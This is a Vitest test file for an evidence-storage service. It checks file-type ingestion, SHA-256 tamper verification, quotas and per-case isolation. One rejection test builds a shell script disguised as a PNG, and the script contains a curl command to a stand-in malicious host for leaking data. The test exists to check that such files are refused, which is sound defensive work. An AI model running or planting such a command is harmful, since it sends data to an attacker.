import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fsp from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { Readable } from 'node:stream';
import {
  EvidenceRegister,
  getEvidenceRegister,
  hashFile,
  VerificationStatus,
  EvidenceError,
} from '../../../src/services/evidenceStore.js';
import { LocalStorageAdapter } from '../../../src/lib/storage/index.js';

describe('Services: EvidenceRegister & Ingestion Pipeline (evidenceStore.ts)', () => {
  let tempStorageDir: string;
  let storageAdapter: LocalStorageAdapter;

  beforeEach(async () => {
    tempStorageDir = await fsp.mkdtemp(path.join(os.tmpdir(), 'veratrace-service-test-'));
    storageAdapter = new LocalStorageAdapter(tempStorageDir);
  });

  afterEach(async () => {
    await fsp.rm(tempStorageDir, { recursive: true, force: true }).catch(() => {});
  });

  const VALID_PNG_BUFFER = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
    0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
    0x08, 0x06, 0x00, 0x00, 0x00, 0x5c, 0x72, 0xa8, 0x66,
    0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44,
    0xae, 0x42, 0x60, 0x82,
  ]);

  const VALID_JPEG_BUFFER = Buffer.from([
    0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
    0x01, 0x01, 0x00, 0x48, 0x00, 0x48, 0x00, 0x00,
    0xff, 0xd9,
  ]);

  const VALID_PDF_BUFFER = Buffer.from(
    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF'
  );

  const VALID_TEXT_BUFFER = Buffer.from(
    'INCIDENT LOG\nDate: 2026-10-24\nThreatening message received from unknown user.\n'
  );

  describe('Successful Ingestion Across Supported File Types', () => {
    it('ingests PNG screenshot and formats record adhering to Person 1 UI contract', async () => {
      const register = new EvidenceRegister('case_1001', storageAdapter);

      const record = await register.addRecord({
        name: 'harassment-chat.png',
        buffer: VALID_PNG_BUFFER,
        userClaimedSource: 'Victim Phone Screenshot',
      });

      expect(record.evidenceId).toMatch(/^ev_/);
      expect(record.caseId).toBe('case_1001');
      expect(record.fileName).toBe('harassment-chat.png');
      expect(record.mimeType).toBe('image/png');
      expect(record.sizeBytes).toBe(VALID_PNG_BUFFER.length);
      expect(record.sha256).toMatch(/^[0-9a-f]{64}$/);
      expect(record.verificationStatus).toBe(VerificationStatus.MATCH);
      expect(record.intakeStatus).toBe('PROMOTED');
      expect(record.storageKey).toBe(`raw/case_1001/${record.evidenceId}.raw`);

      // Verify file is stored in permanent raw storage
      expect(await storageAdapter.exists(record.storageKey)).toBe(true);
      // Staged file must be cleaned up post-promotion
      expect(await storageAdapter.exists(`staged/case_1001/${record.evidenceId}.tmp`)).toBe(false);

      // Verify record is retrievable
      expect(register.getRecord(record.evidenceId)).toEqual(record);
      expect(register.getAllRecords()).toHaveLength(1);
    });

    it('ingests JPEG, PDF, and Plain Text successfully', async () => {
      const register = new EvidenceRegister('case_multi', storageAdapter);

      const recJpeg = await register.addRecord({ name: 'photo.jpg', buffer: VALID_JPEG_BUFFER });
      const recPdf = await register.addRecord({ name: 'email-thread.pdf', buffer: VALID_PDF_BUFFER });
      const recTxt = await register.addRecord({ name: 'sms-log.txt', buffer: VALID_TEXT_BUFFER });

      expect(recJpeg.mimeType).toBe('image/jpeg');
      expect(recPdf.mimeType).toBe('application/pdf');
      expect(recTxt.mimeType).toBe('text/plain');

      const all = register.getAllRecords();
      expect(all).toHaveLength(3);
    });

    it('ingests evidence from stream source directly', async () => {
      const register = new EvidenceRegister('case_stream', storageAdapter);
      const stream = Readable.from([VALID_PDF_BUFFER]);

      const record = await register.addRecord({
        name: 'streamed-evidence.pdf',
        stream,
      });

      expect(record.sizeBytes).toBe(VALID_PDF_BUFFER.length);
      expect(record.mimeType).toBe('application/pdf');
      expect(await storageAdapter.exists(record.storageKey)).toBe(true);
    });

    it('ingests PDF larger than 64 KiB and extracts trailer metadata from end of file', async () => {
      const register = new EvidenceRegister('case_large_pdf', storageAdapter);

      const header =
        '%PDF-1.4\n' +
        '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n' +
        '2 0 obj\n<< /Type /Pages /Count 4 >>\nendobj\n' +
        '3 0 obj\n<< /Length 70000 >>\nstream\n';
      const streamBody = 'Z'.repeat(70000);
      const trailer =
        '\nendstream\nendobj\n' +
        '4 0 obj\n<< /Title (Extracted Legal Complaint) /CreationDate (D:20261025150000+05\'30\') >>\nendobj\n' +
        'trailer\n<< /Root 1 0 R /Info 4 0 R >>\n%%EOF\n';

      const largePdf = Buffer.from(header + streamBody + trailer, 'latin1');
      expect(largePdf.length).toBeGreaterThan(65536);

      const record = await register.addRecord({
        name: 'large-case-complaint.pdf',
        buffer: largePdf,
      });

      expect(record.mimeType).toBe('application/pdf');
      expect(record.sizeBytes).toBe(largePdf.length);
      expect(record.extractedMetadata).toBeDefined();
      expect(record.extractedMetadata?.status).toBe('SUCCESS');
      // 15:00:00 at +05:30 -> 09:30:00 UTC
      expect(record.extractedMetadata?.extractedFileTimeUtc).toBe('2026-10-25T09:30:00.000Z');
      expect(record.extractedMetadata?.extractedFileTimezone).toBe('+05:30');
      expect((record.extractedMetadata?.metadata?.info as any)?.title).toBe('Extracted Legal Complaint');
    });
  });

  describe('Rejection of Disallowed Executables & Quota Violations', () => {
    it('rejects shell script disguised with .png extension and leaves no storage residue', async () => {
      const register = new EvidenceRegister('case_security', storageAdapter);
      const maliciousScript = Buffer.from('#!/bin/bash\ncurl http://malicious.site/leak\n');

      await expect(
        register.addRecord({ name: 'fake-photo.png', buffer: maliciousScript })
      ).rejects.toThrow(EvidenceError);

      try {
        await register.addRecord({ name: 'fake-photo.png', buffer: maliciousScript });
      } catch (err: unknown) {
        const evErr = err as EvidenceError;
        expect(evErr.code).toBe('ERR_UNSUPPORTED_MEDIA_TYPE');
      }

      // Ensure no files were left in permanent or staged storage
      const stagedFiles = await storageAdapter.listStagedFiles();
      expect(stagedFiles).toHaveLength(0);
      expect(register.getAllRecords()).toHaveLength(0);
    });

    it('rejects empty files with ERR_EMPTY_STREAM_REJECTED', async () => {
      const register = new EvidenceRegister('case_empty', storageAdapter);

      await expect(
        register.addRecord({ name: 'empty.png', buffer: Buffer.alloc(0) })
      ).rejects.toThrow(EvidenceError);

      try {
        await register.addRecord({ name: 'empty.png', buffer: Buffer.alloc(0) });
      } catch (err: unknown) {
        expect((err as EvidenceError).code).toBe('ERR_EMPTY_STREAM_REJECTED');
      }
    });

    it('enforces quota and rejects oversized uploads', async () => {
      const register = new EvidenceRegister('case_quota', storageAdapter);
      const limit = 50;
      const oversized = Buffer.alloc(100, 0x41);

      await expect(
        register.addRecord({
          name: 'oversized.txt',
          buffer: oversized,
          maxBytes: limit,
        })
      ).rejects.toThrow(EvidenceError);

      try {
        await register.addRecord({
          name: 'oversized.txt',
          buffer: oversized,
          maxBytes: limit,
        });
      } catch (err: unknown) {
        expect((err as EvidenceError).code).toBe('ERR_UPLOAD_QUOTA_EXCEEDED');
      }
    });
  });

  describe('Cryptographic Verification Seam (verify)', () => {
    it('verifies integrity against candidate file buffer (MATCH vs MISMATCH)', async () => {
      const register = new EvidenceRegister('case_verify', storageAdapter);
      const record = await register.addRecord({ name: 'verify-target.png', buffer: VALID_PNG_BUFFER });

      // 1. Candidate matches original
      const matchResult = await register.verify(record.evidenceId, VALID_PNG_BUFFER);
      expect(matchResult.status).toBe(VerificationStatus.MATCH);
      expect(matchResult.candidateHash).toBe(record.sha256);
      expect(matchResult.referenceHash).toBe(record.sha256);

      // 2. Candidate differs from original
      const tamperedBuffer = Buffer.from(VALID_PNG_BUFFER);
      tamperedBuffer[VALID_PNG_BUFFER.length - 1] = 0x00; // mutate 1 byte

      const mismatchResult = await register.verify(record.evidenceId, tamperedBuffer);
      expect(mismatchResult.status).toBe(VerificationStatus.MISMATCH);
      expect(mismatchResult.candidateHash).not.toBe(record.sha256);
      expect(mismatchResult.referenceHash).toBe(record.sha256);
    });

    it('performs storage integrity audit when candidate file is omitted', async () => {
      const register = new EvidenceRegister('case_audit', storageAdapter);
      const record = await register.addRecord({ name: 'audit-file.pdf', buffer: VALID_PDF_BUFFER });

      const auditResult = await register.verify(record.evidenceId);
      expect(auditResult.status).toBe(VerificationStatus.MATCH);
      expect(auditResult.candidateHash).toBe(record.sha256);
    });

    it('throws EvidenceError when verifying non-existent evidenceId', async () => {
      const register = new EvidenceRegister('case_not_found', storageAdapter);
      await expect(register.verify('ev_missing')).rejects.toThrow(EvidenceError);
    });
  });

  describe('Multi-Tenancy & Case Isolation (getEvidenceRegister)', () => {
    it('isolates evidence records strictly by caseId', async () => {
      const register1 = getEvidenceRegister('case_alpha', storageAdapter);
      const register2 = getEvidenceRegister('case_beta', storageAdapter);

      await register1.addRecord({ name: 'alpha.png', buffer: VALID_PNG_BUFFER });
      await register2.addRecord({ name: 'beta.pdf', buffer: VALID_PDF_BUFFER });

      expect(register1.getAllRecords()).toHaveLength(1);
      expect(register2.getAllRecords()).toHaveLength(1);
      expect(register1.getAllRecords()[0].fileName).toBe('alpha.png');
      expect(register2.getAllRecords()[0].fileName).toBe('beta.pdf');
    });
  });

  describe('hashFile Helper Utility', () => {
    it('computes 64-character lowercase SHA-256 for buffer and stream', async () => {
      const hashFromBuf = await hashFile(VALID_PNG_BUFFER);
      const hashFromStream = await hashFile(Readable.from([VALID_PNG_BUFFER]));

      expect(hashFromBuf).toMatch(/^[0-9a-f]{64}$/);
      expect(hashFromBuf).toBe(hashFromStream);
    });
  });
});
